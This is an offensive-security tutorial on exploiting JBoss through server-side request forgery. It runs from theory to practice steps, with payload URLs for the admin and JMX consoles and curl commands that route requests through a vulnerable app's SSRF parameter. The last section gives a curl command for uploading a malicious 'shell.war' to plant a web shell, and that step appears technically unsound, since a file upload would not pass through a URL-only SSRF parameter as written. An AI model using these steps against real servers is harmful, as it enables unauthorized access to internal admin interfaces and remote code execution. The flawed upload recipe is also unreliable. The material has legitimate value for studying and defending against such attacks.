# JBoss

## Context

This article outlines the exploitation of JBoss HTTP-based services using Server-Side Request Forgery (SSRF) to gain unauthorized access to internal management consoles and perform administrative actions. The attacker leverages SSRF vulnerabilities to redirect HTTP requests originating from the server to internal interfaces, allowing bypass of network restrictions. This approach is premised on knowledge of HTTP protocol, server configuration, web application architecture, and SSRF techniques.

## Theory

### JBoss Management Console Exposure via SSRF

**Definition:**  
JBoss is a Java EE application server that features a web-based management console for administrative purposes. This console facilitates the deployment and management of server applications.

**Core Principle:**  
Server-Side Request Forgery (SSRF) exploits can redirect HTTP requests from server origins to internal admin endpoints of JBoss, which are typically not accessible from external networks.

**Vulnerability Model:**  
An existing SSRF vulnerability allows attackers to attempt access to JBoss management interfaces bound to localhost or internal subnets.

### Internal Admin Service Attack Surface

**Definition:**  
JBoss exposes its management endpoints such as `/admin-console` and `/jmx-console` over HTTP(S), often configured to be reachable only from localhost or specific internal IPs.

**Attack Sequence:**  
Attackers use SSRF to craft requests aimed at these JBoss admin endpoints, effectively circumventing network constraints to exploit them.

**Trust Assumption:**  
JBoss commonly assumes requests from localhost or trusted networks are legitimate. In several versions, default configurations may lack robust authentication mechanisms.

### Exploiting JBoss via SSRF

**Attack Sequence:**  
- Identify an SSRF entry point.
- Enumerate internal endpoints within JBoss.
- Initiate interactions with the management console via SSRF.
- Execute administrative tasks, such as deploying web applications or executing commands.

## Practice

### Enumerate and Access JBoss Management Console via SSRF

- **Identify SSRF Injection Point:** Locate where in the web application an attacker can control the URLs requested by the server.

- **Payload:** Access a known JBoss admin console endpoint using SSRF.

    ```http
    http://127.0.0.1:8080/admin-console/
    ```

- **Command Line:** Trigger SSRF to access the JBoss admin console.

    ```bash
    curl -X GET 'http://vulnerable-app/ssrf?url=http://127.0.0.1:8080/admin-console/'
    ```

- **Analysis:** Examine the SSRF response for elements indicative of the JBoss admin console, like specific HTML titles or login forms.

### Interact with JBoss Admin Endpoints for Exploitation

- **Payload:** Target the JMX console, another management interface of JBoss.

    ```http
    http://127.0.0.1:8080/jmx-console/
    ```

- **Command Line:** Send SSRF request to access the JBoss JMX console.

    ```bash
    curl -X GET 'http://vulnerable-app/ssrf?url=http://127.0.0.1:8080/jmx-console/'
    ```

- **Admin Actions Discovery:** Inspect the SSRF response to determine if any administrative actions, such as application deployment or execution, can be performed.

### Deploy Malicious Application via JBoss Console (if accessible)

- **Payload:** Location of the JBoss management endpoint for deploying applications.

    ```http
    http://127.0.0.1:8080/management/upload
    ```

- **Command Line:** Attempt to upload a malicious WAR file using SSRF.

    ```bash
    curl -X POST -F 'file=@shell.war' 'http://vulnerable-app/ssrf?url=http://127.0.0.1:8080/management/upload'
    ```

- **Verification:** Check if the malicious application is deployed successfully, potentially through a shell accessible via the SSRF response.
